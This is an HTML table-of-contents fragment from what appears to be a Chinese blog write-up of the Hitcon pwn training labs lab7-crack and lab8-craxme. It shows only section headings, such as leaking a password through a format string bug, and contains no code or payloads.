+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10月26-Hitcon-四"><span class="post-toc-text">Pwn-10月26-Hitcon-四</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab7-crack"><span class="post-toc-text">lab7-crack</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析"><span class="post-toc-text">逻辑分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp1：通过格式化字符串漏洞泄露password"><span class="post-toc-text">exp1：通过格式化字符串漏洞泄露password</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp2：修改随机数"><span class="post-toc-text">exp2：修改随机数</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab8-craxme"><span class="post-toc-text">lab8-craxme</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施-1"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析-1"><span class="post-toc-text">逻辑分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol>
             </div>
         </div>
     </div>
